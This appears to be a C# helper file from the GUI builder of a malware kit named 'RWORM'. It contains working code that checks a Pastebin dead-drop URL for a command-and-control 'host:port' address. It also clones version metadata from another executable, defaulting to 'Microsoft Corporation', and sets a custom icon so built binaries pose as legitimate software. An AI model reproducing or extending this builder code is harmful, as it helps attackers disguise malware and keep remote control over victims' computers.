using System;
using System.IO;
using System.Net.Http;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32;

namespace RWORM.GUI.ViewModels
{
    public static class BuilderHelper
    {
        public static string GenerateRandomEncryptionKey(int length = 24)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            var random = new Random();
            var result = new char[length];
            for (int i = 0; i < length; i++)
            {
                result[i] = chars[random.Next(chars.Length)];
            }
            return new string(result);
        }

        public static async Task TestPastebinUrlAsync(string url)
        {
            if (string.IsNullOrWhiteSpace(url))
            {
                MessageBox.Show("Please enter a Pastebin Raw URL first.", "Test Pastebin", MessageBoxButton.OK, MessageBoxImage.Warning);
                return;
            }

            try
            {
                using var client = new HttpClient { Timeout = TimeSpan.FromSeconds(6) };
                var content = await client.GetStringAsync(url.Trim());
                content = content.Trim();

                
                var match = Regex.Match(content, @"^(?:[a-zA-Z0-9\.\-]+):(\d{1,5})$");
                if (match.Success && int.TryParse(match.Groups[1].Value, out int port) && port > 0 && port <= 65535)
                {
                    MessageBox.Show($"Verification Succeeded!\n\nFetched payload content:\n{content}\n\nValid Host:Port endpoint format detected.",
                        "Pastebin Verification", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                else
                {
                    MessageBox.Show($"Verification Warning!\n\nFetched content from URL:\n\"{content}\"\n\nDoes NOT match expected 'ip:port' or 'host:port' format.",
                        "Pastebin Verification", MessageBoxButton.OK, MessageBoxImage.Warning);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to fetch from Pastebin URL:\n{ex.Message}", "Connection Error", MessageBoxButton.OK, MessageBoxImage.Error);
            }
        }

        public static void CloneAssemblyFromFile(MainViewModel vm)
        {
            var dlg = new OpenFileDialog
            {
                Title = "Select Executable to Clone Assembly From",
                Filter = "Executables (*.exe;*.dll)|*.exe;*.dll|All Files (*.*)|*.*"
            };

            if (dlg.ShowDialog() == true)
            {
                try
                {
                    var vi = System.Diagnostics.FileVersionInfo.GetVersionInfo(dlg.FileName);
                    vm.BuildAssemblyTitle = !string.IsNullOrEmpty(vi.InternalName) ? vi.InternalName : (!string.IsNullOrEmpty(vi.FileDescription) ? vi.FileDescription : Path.GetFileNameWithoutExtension(dlg.FileName));
                    vm.BuildAssemblyDescription = !string.IsNullOrEmpty(vi.FileDescription) ? vi.FileDescription : vm.BuildAssemblyTitle;
                    vm.BuildAssemblyCompany = !string.IsNullOrEmpty(vi.CompanyName) ? vi.CompanyName : "Microsoft Corporation";
                    vm.BuildAssemblyProduct = !string.IsNullOrEmpty(vi.ProductName) ? vi.ProductName : vm.BuildAssemblyTitle;
                    vm.BuildAssemblyCopyright = !string.IsNullOrEmpty(vi.LegalCopyright) ? vi.LegalCopyright : $"© {vm.BuildAssemblyCompany}. All rights reserved.";
                    
                    var ver = !string.IsNullOrEmpty(vi.FileVersion) ? vi.FileVersion.Split(' ')[0] : "1.0.0.0";
                    vm.BuildAssemblyVersion = ver;
                    vm.BuildAssemblyEnabled = true;

                    MessageBox.Show($"Successfully cloned metadata from:\n{Path.GetFileName(dlg.FileName)}\n\nTitle: {vm.BuildAssemblyTitle}\nCompany: {vm.BuildAssemblyCompany}\nVersion: {vm.BuildAssemblyVersion}",
                        "Assembly Cloned", MessageBoxButton.OK, MessageBoxImage.Information);
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Failed to read assembly metadata: {ex.Message}", "Error", MessageBoxButton.OK, MessageBoxImage.Error);
                }
            }
        }

        public static void SelectIconFile(MainViewModel vm)
        {
            var dlg = new OpenFileDialog
            {
                Title = "Select Icon File (.ico)",
                Filter = "Icon Files (*.ico)|*.ico|All Files (*.*)|*.*"
            };

            var repoIcons = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "..", "..", "..", "Icons");
            if (Directory.Exists(repoIcons))
            {
                dlg.InitialDirectory = Path.GetFullPath(repoIcons);
            }

            if (dlg.ShowDialog() == true)
            {
                vm.BuildIconPath = dlg.FileName;
                vm.BuildIconEnabled = true;
                MessageBox.Show($"Icon selected:\n{Path.GetFileName(dlg.FileName)}", "Icon Selected", MessageBoxButton.OK, MessageBoxImage.Information);
            }
        }
    }
}
